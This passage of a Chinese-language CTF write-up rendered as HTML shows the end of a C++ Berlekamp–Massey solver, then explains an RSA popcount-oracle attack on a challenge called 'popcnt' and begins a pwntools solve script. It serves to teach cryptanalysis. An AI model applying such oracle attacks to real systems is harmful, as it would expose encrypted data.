style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>1</span> }; <span style=color:#75715e>// from output.py
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    debug(arr.size());
</span></span><span style=display:flex><span>    reverse(arr.begin(), arr.end());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>auto</span> ini <span style=color:#f92672>=</span> vector<span style=color:#f92672>&lt;</span>Modular<span style=color:#f92672>&lt;</span><span style=color:#66d9ef>int</span>,<span style=color:#ae81ff>2</span><span style=color:#f92672>&gt;&gt;</span>(arr.begin(), arr.begin() <span style=color:#f92672>+</span> <span style=color:#ae81ff>300</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>auto</span> s <span style=color:#f92672>=</span> linear_recurrence<span style=color:#f92672>::</span>BerlekampMassey(ini);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>300</span>; i <span style=color:#f92672>&lt;</span> arr.size(); i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        ini.push_back(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> s.size(); j<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>            ini[i] <span style=color:#f92672>+=</span> ini[i <span style=color:#f92672>-</span> j <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>*</span> s[j];
</span></span><span style=display:flex><span>        arr[i] <span style=color:#f92672>+=</span> ini[i];
</span></span><span style=display:flex><span>        <span style=color:#75715e>// arr[j] += linear_recurrence::deduce(ini, j);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
</span></span><span style=display:flex><span>    reverse(arr.begin(), arr.end());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> sum <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> arr.size() <span style=color:#f92672>-</span> <span style=color:#ae81ff>300</span>; j<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (j <span style=color:#f92672>%</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) arr[j] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        cout <span style=color:#f92672>&lt;&lt;</span> arr[j];
</span></span><span style=display:flex><span>        sum <span style=color:#f92672>+=</span> (arr[j]() <span style=color:#f92672>&lt;&lt;</span> (<span style=color:#ae81ff>7</span> <span style=color:#f92672>-</span> j <span style=color:#f92672>%</span> <span style=color:#ae81ff>8</span>));
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (j <span style=color:#f92672>%</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>7</span>) {
</span></span><span style=display:flex><span>            cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39; &#39;</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#66d9ef>char</span>(sum);
</span></span><span style=display:flex><span>            sum <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>            cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;\n&#39;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><h3 id=popcnt>popcnt</h3><p>題目</p><blockquote><p>給你 flag 經過 RSA 加密後的結果，然後你可以詢問任意數字解密過後的 popcnt。<br>有一個有趣的地方是一次連線會隨機生成 10 對密鑰，flag 用這 10 對公鑰加密的結果（<code>enc[i]</code>）都會告訴你，而且詢問任意數字解密過後的 popcnt 也可以針對任意一對密鑰。<br>每對密鑰的公鑰 $e_i$以及 $N_i$ 都會告訴你。</p></blockquote><p>把 flag 寫作 $x$，因為 RSA 加密是 $x^e \pmod N$的特性，我們可以問 <code>enc[i] * pow(c, e, n) % n</code> 就能得到 $cx \% N$ 的 popcnt。</p><p>考慮 $x \% N$ 和 $2x \% N$。$2x \% N$ 沒有進位的話，popcnt 一定會跟 $x \% N$ 的 popcnt 相同，否則有足夠大的機率 popcnt 會不一樣（我猜剛好一樣的機率可能是 1/1000 之類的量級）<br>所以我們可以用很高的機率得知 $x$ 是 $\leq N/2$ 還是 $> N/2$。<br>以此類推我們可以比較 $2^i x \% N$ 和 $2^{i+1} x \% N$ 的 popcnt 就能大概猜出 $2^i x \% N$ 與 $N/2$ 的大小關係。<br>這等於是問說 $\lfloor \frac{x}{N/{2^{i+1}}} \rfloor$ 的奇偶性之類的<br>所以我們可以用類似二分搜的方式找到答案。</p><p>不過，要注意 popcnt 相同還是有夠大的機率會發生的，我們可以利用一次連線有 10 對密鑰且隨機的特性把這些不常發生的錯誤過濾掉。<br>我最後的寫法是：</p><ul><li>有兩個變數 $L, R$ 表示 flag 一定落在 $[L, R]$ 之間。</li><li>所有人獨立的做 5 輪二分搜得到新的 $[l_i, r_i]$。一次二分搜的輪數有點微妙，不能太大讓一次太多人一起發生錯誤，也不能太小以致於下一個步驟沒有足夠多的資訊辨別出是誰壞掉（？）一開始挑 20 後來改成 5，我覺得 5 應該還不錯。</li><li>把太小跟太大的丟掉，剩下的聯集起來，得到新的 $[L, R]$。</li><li>理論上因為做了 5 輪所以區間長度會縮減為 1/32 倍之類的</li><li>如果區間長度縮減不到 0.1 倍，那大概壞掉太多了，重新連線但不重設 $[L, R]$。不重設很重要，因為是有蠻大的機率在搜到某一段的時候每對都壞掉的，但不同連線得到的 $[L, R]$ 應該要 consistent 所以我們可以原地復活（題目有幫 flag pad 一些 random 的值但不太重要）。</li></ul><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long, long_to_bytes
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64encode, b64decode
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> fractions <span style=color:#f92672>import</span> Fraction
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> tqdm <span style=color:#f92672>import</span> tqdm
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> pickle
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># context.log_level = &#39;debug&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>init</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> r, ks, mp
